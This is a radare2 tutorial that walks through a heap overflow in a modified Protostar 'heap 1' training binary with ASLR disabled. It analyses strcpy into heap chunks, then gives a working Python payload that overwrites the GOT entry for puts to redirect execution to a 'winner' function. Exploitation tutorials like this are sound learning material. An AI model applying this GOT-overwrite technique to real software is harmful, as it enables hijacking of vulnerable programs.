# Survival guide to radare2 // heap overflow without ASLR

For this tutorial we'll see how to exploit a very simple heap overflow. I'll use a binary I took from the chall "heap 1" at the protostar project and that I modified a bit.

[Here you can get the binary](//github.com/ZigzagSecurity/survival-guide-radare2/raw/master/heap_overflow/heapOvf)

[And here the source code](//github.com/ZigzagSecurity/survival-guide-radare2/raw/master/heap_overflow/heapOvf.c)

I'm not going to dig into the complexity of bypassing all the vulnerability so I'm gonna deactivate them all.

First of all, the ASLR :\
`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
(to put it back, just use a 1 instead of the 0)

Then at the compilation use these flags to have a correct binary :\
`gcc ./heapOvf.c -o heapOvf -Werror -m32 -no-pie`

## The beginning

Let's start by running the executable :
```
./heapOvf 
Usage : heapOvf arg1 arg2
```
Okey then, with 2 arguments :
```
./heapOvf AAAA BBBB
And that's it !
```
Not that much clues about what it's really happening.\
Let's check the assembly (yay!)

## Firing the Radare

`radare2 -AA ./heapOvf`\
Here, the `-AA` is to start the analyse with `aaaa` at the execution.\

Then we go to the main and print the code :
```
[0x080491df]> s main
[0x080491df]> pdf
```

![](https://github.com/ZigzagSecurity/survival-guide-radare2/blob/master/heap_overflow/main.png)
The obvious things here are the 4 malloc (so the heap is used) and the 2 strcopy probably of our arguments (yew that smell like an entry point)

We can also check if we have any interesting function :
```
[0xf7fd1079]> afl
0x08049000    3 32           sym._init
0x08049030    1 6            sym.imp.printf
0x08049040    1 6            sym.imp.time
0x08049050    1 6            sym.imp.strcpy
0x08049060    1 6            sym.imp.malloc
0x08049070    1 6            sym.imp.puts
0x08049080    1 6            sym.imp.__libc_start_main
0x08049090    1 50           entry0
0x080490c3    1 4            fcn.080490c3
0x080490d0    1 1            sym._dl_relocate_static_pie
0x080490e0    1 4            sym.__x86.get_pc_thunk.bx
0x080490f0    4 49   -> 40   sym.deregister_tm_clones
0x08049130    4 57   -> 53   sym.register_tm_clones
0x08049170    3 33   -> 30   sym.__do_global_dtors_aux
0x080491a0    1 2            entry.init0
0x080491a2    1 61           sym.winner
0x080491df    4 240          main
0x080492d0    4 85           sym.__libc_csu_init
0x08049330    1 1            sym.__libc_csu_fini
0x08049334    1 20           sym._fini
```

ok so we have the winner function, let's take a look.
```
[0xf7fd1079]> pdf @sym.winner
/ (fcn) sym.winner 61
|   sym.winner ();
|           ; var int local_ch @ ebp-0xc
|           ; var int local_4h @ ebp-0x4
|           0x080491a2      55             push ebp
|           0x080491a3      89e5           mov ebp, esp
|           0x080491a5      53             push ebx
|           0x080491a6      83ec14         sub esp, 0x14
|           0x080491a9      e832ffffff     call sym.__x86.get_pc_thunk.bx
|           0x080491ae      81c3522e0000   add ebx, 0x2e52             ; 'R.'
|           0x080491b4      83ec0c         sub esp, 0xc
|           0x080491b7      6a00           push 0
|           0x080491b9      e882feffff     call sym.imp.time           ; time_t time(time_t *timer)
|           0x080491be      83c410         add esp, 0x10
|           0x080491c1      8945f4         mov dword [local_ch], eax
|           0x080491c4      83ec08         sub esp, 8
|           0x080491c7      ff75f4         push dword [local_ch]
|           0x080491ca      8d8308e0ffff   lea eax, dword [ebx - 0x1ff8]
|           0x080491d0      50             push eax
|           0x080491d1      e85afeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x080491d6      83c410         add esp, 0x10
|           0x080491d9      90             nop
|           0x080491da      8b5dfc         mov ebx, dword [local_4h]
|           0x080491dd      c9             leave
\           0x080491de      c3             ret
```
It prints something so that must be the flag. But this function is never called in the main, that's surely the goal of the exploitation, calling "winner".

## Examining the heap

OK, we should check what is done with the heap. First, we charge the binary in debug mode with our 2 arguments and execute it.
```
[0x080491df]> ood AAAA BBBB
Process with PID 12124 started...
File dbg:///home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf  AAAA BBBB reopened in read-write mode
= attach 12124 12124
12124
[0xf7faf0b0]> dc
And that's it !
```
Everything goes as wished, so it's time to find he heap. Radare has few commands to display the memory maps and best for now is `dm` :
```
[0xf7fd1079]> dm
0x08048000 - 0x08049000 - usr     4K s r-- /home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf /home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf ; segment.ehdr
0x08049000 - 0x0804a000 - usr     4K s r-x /home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf /home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf ; map.home_zigzag_Documents_survival_guide_radare2_heap_overflow_heapOvf.r_x
0x0804a000 - 0x0804b000 - usr     4K s r-- /home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf /home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf ; map.home_zigzag_Documents_survival_guide_radare2_heap_overflow_heapOvf.r
0x0804b000 - 0x0804c000 - usr     4K s r-- /home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf /home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf ; map.home_zigzag_Documents_survival_guide_radare2_heap_overflow_heapOvf.rw
0x0804c000 - 0x0804d000 - usr     4K s rw- /home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf /home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf ; obj._GLOBAL_OFFSET_TABLE
0x0a020000 - 0x0a042000 - usr   136K s rw- [heap] [heap]
0xf7dab000 - 0xf7dc4000 - usr   100K s r-- /lib32/libc-2.28.so /lib32/libc-2.28.so
0xf7dc4000 - 0xf7f12000 - usr   1.3M s r-x /lib32/libc-2.28.so /lib32/libc-2.28.so
0xf7f12000 - 0xf7f82000 - usr   448K s r-- /lib32/libc-2.28.so /lib32/libc-2.28.so
0xf7f82000 - 0xf7f83000 - usr     4K s --- /lib32/libc-2.28.so /lib32/libc-2.28.so
0xf7f83000 - 0xf7f85000 - usr     8K s r-- /lib32/libc-2.28.so /lib32/libc-2.28.so
0xf7f85000 - 0xf7f86000 - usr     4K s rw- /lib32/libc-2.28.so /lib32/libc-2.28.so ; ebp
0xf7f86000 - 0xf7f89000 - usr    12K s rw- unk0 unk0
0xf7fcb000 - 0xf7fcd000 - usr     8K s rw- unk1 unk1
0xf7fcd000 - 0xf7fd0000 - usr    12K s r-- [vvar] [vvar] ; map.vvar_.r
0xf7fd0000 - 0xf7fd2000 * usr     8K s r-x [vdso] [vdso] ; map.vdso_.r_x
0xf7fd2000 - 0xf7fd3000 - usr     4K s r-- /lib32/ld-2.28.so /lib32/ld-2.28.so
0xf7fd3000 - 0xf7fef000 - usr   112K s r-x /lib32/ld-2.28.so /lib32/ld-2.28.so ; map.lib32_ld_2.28.so.r_x
0xf7fef000 - 0xf7ff9000 - usr    40K s r-- /lib32/ld-2.28.so /lib32/ld-2.28.so ; map.lib32_ld_2.28.so.r
0xf7ffa000 - 0xf7ffb000 - usr     4K s r-- /lib32/ld-2.28.so /lib32/ld-2.28.so ; map.lib32_ld_2.28.so.rw
0xf7ffb000 - 0xf7ffc000 - usr     4K s rw- /lib32/ld-2.28.so /lib32/ld-2.28.so
0xffe13000 - 0xffe34000 - usr   132K s rw- [stack] [stack] ; map.stack_.rw
```
So now we have the libs, the stack and the heap localization. We can print our heap to take a closer look. 

![](https://github.com/ZigzagSecurity/survival-guide-radare2/blob/master/heap_overflow/heap.png)

We clearly see arguments copied in the heap in to different chuncks and also two chunck that have a 1 or a 2 and the address from where our arguments start.

You can also check all different combination of command to have a look at the heap or other sections. Like `dmh` and so on, never forget to use the "?" to have some help on your command.

## Exploit
So we have a program that takes 2 arguments and put them on the heap. But it uses "strcopy", it's not safe cause there is no limitation on what's copied.\
We can surely use that to overwrite the heap and have some control on the strcopy.

Ok let's have a good old buffer overflow ! Recharge our binary :
```
[0xf7e11079]> ood AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH 00001111222233334444
Wait event received by different pid 12573
Process with PID 12576 started...
File dbg:///home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf  AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH 00001111222233334444 reopened in read-write mode
= attach 12576 12576
Unable to find filedescriptor 5
Unable to find filedescriptor 6
Unable to find filedescriptor 5
Unable to find filedescriptor 6
12576
[0xf7f140b0]> dc
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x46464646 code=1 ret=0
```
ok we have a segfault with 0x46, that's F in hexa, seems like we have something here.\
let's see our heap again :\
![](https://github.com/ZigzagSecurity/survival-guide-radare2/blob/master/heap_overflow/heap2.png)

So we have the FFFF right where we normally have the starting address of our second argument. Then we can specify anywhere we want to write our second argument.

The thing here would be to overwrite the call of "puts" after all the strcopy to call "winner" instead.\
To do that, we can overwrite the address of "puts" on the Global Offset Table and replace it by the "winner" address.

### Let's try

First we can get the two addresses we need :
```
[0xf7d7c079]> afl ~puts
0x08049070    1 6            sym.imp.puts
[0xf7d7c079]> pdf @0x08049070
/ (fcn) sym.imp.puts 6
|   sym.imp.puts (const char *s);
|           ; CALL XREFS from main (0x804920e, 0x80492b7)
\           0x08049070      ff251cc00408   jmp dword [reloc.puts]      ; 0x804c01c ; "v\x90\x04\bPj\xd0\xf7"
[0xf7d7c079]> !objdump -R ./heapOvf

./heapOvf:     format de fichier elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
0804bffc R_386_GLOB_DAT    __gmon_start__
0804c00c R_386_JUMP_SLOT   printf@GLIBC_2.0
0804c010 R_386_JUMP_SLOT   time@GLIBC_2.0
0804c014 R_386_JUMP_SLOT   strcpy@GLIBC_2.0
0804c018 R_386_JUMP_SLOT   malloc@GLIBC_2.0
0804c01c R_386_JUMP_SLOT   puts@GLIBC_2.0
0804c020 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0


[0xf7d7c079]> afl ~winner
0x080491a2    1 61           sym.winner
[0xf7d7c079]> 
```
So, we display the address of puts with "afl" and the grep command for radare, the "~". Then get the code of the function. We see that it's basically just a jump the address on the GOT, the real adress of puts. We can verify it with "objdump", it's possible to execute a command like we could do outside radare with the "!" prefix. And finally, we have the address of winner.

We can now try to overwrite puts in the GOT :
```
[0x30303030]> ood `!python -c "print 'AAAABBBBCCCCDDDDEEEE\x1c\xc0\x04\x08 00001111'"`
Wait event received by different pid 13154
Wait event received by different pid 13236
Process with PID 13242 started...
File dbg:///home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf  AAAABBBBCCCCDDDDEEEE 00001111 reopened in read-write mode
= attach 13242 13242
Unable to find filedescriptor 5
Unable to find filedescriptor 6
Unable to find filedescriptor 5
Unable to find filedescriptor 6
13242
[0xf7fcd0b0]> dc
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x30303030 code=1 ret=0
[0x30303030]> drr
   eax 0x804a03d   eax heap program R 0x20646e41 (And that's it !) -->  ascii
   ebx 0x804c000   ebx heap program R W 0x804bf14 -->  obj._DYNAMIC heap program R 0x1 -->  (.comment)
   ecx 0xffe472d8  ecx stack R W 0x30303030 (00001111) -->  eip ascii
   edx 0x804c01c   edx heap program R W 0x30303030 (00001111) -->  eip ascii
   esi 0xffe466f0  esi stack R W 0x3 -->  (.comment)
   edi 0xf7f7f000  (/lib32/libc-2.28.so) edi library R W 0x1d9d6c
   esp 0xffe4669c  esp stack R W 0x80492bc -->  main heap program R X 'add esp, 0x10' 'heapOvf'
   ebp 0xffe466d8  ebp stack R W 0x0 -->  loc.imp.__gmon_start
   eip 0x30303030  eip ascii
   xfs 0x0         loc.imp.__gmon_start
   xgs 0x63        (.symtab) ascii
   xcs 0x23        (.symtab) ascii
   xss 0x2b        (.symtab) ascii
eflags 1ASIV       eflags
  oeax 0xffffffff  oeax
[0x30303030]> 
```

A little bit of explanation on the above. We charged the binary with the arguments, you can see that I used the little trick with the backtick, the exclamation mark and python. The backticks are necessarily for radare to understand that the python command stands for argument. The "!" is here to execute the python command and the python is here to put the hexadecimal values for the address.

During the exeecution we got a segfault as we predict because the binary tried to execute the function at the address 0x30303030 (thanks to our second argument). We can see with the command `drr` that this address is in the eip so we are good to go !

Let's replace, the 0000 with the winner's address :
```
[0xf7f76079]> ood `!python -c "print 'AAAABBBBCCCCDDDDEEEE\x1c\xc0\x04\x08 \xa2\x91\x04\x08'"`
Wait event received by different pid 13539
Process with PID 13544 started...
File dbg:///home/zigzag/Documents/survival-guide-radare2/heap_overflow/heapOvf  AAAABBBBCCCCDDDDEEEE � reopened in read-write mode
= attach 13544 13544
Unable to find filedescriptor 3
Unable to find filedescriptor 4
Unable to find filedescriptor 5
Unable to find filedescriptor 6
Unable to find filedescriptor 3
Unable to find filedescriptor 4
Unable to find filedescriptor 5
Unable to find filedescriptor 6
13544
[0xf7f550b0]> dc
and we have a winner @ 1552846860
[0xf7f53079]> 
```
That's it ! We have executed our function !\
Last step, we need to know if it works outside radare, but normally it does.
```
zigzag@System:~/Documents/survival-guide-radare2/ $ ./heapOvf $(python -c "print 'AAAABBBBCCCCDDDDEEEE\x1c\xc0\x04\x08 \xa2\x91\x04\x08'")
and we have a winner @ 1552847092
```
Here we go, everything works as expected !

Thanks for reading guys and I hope you have learnt some new stuff :)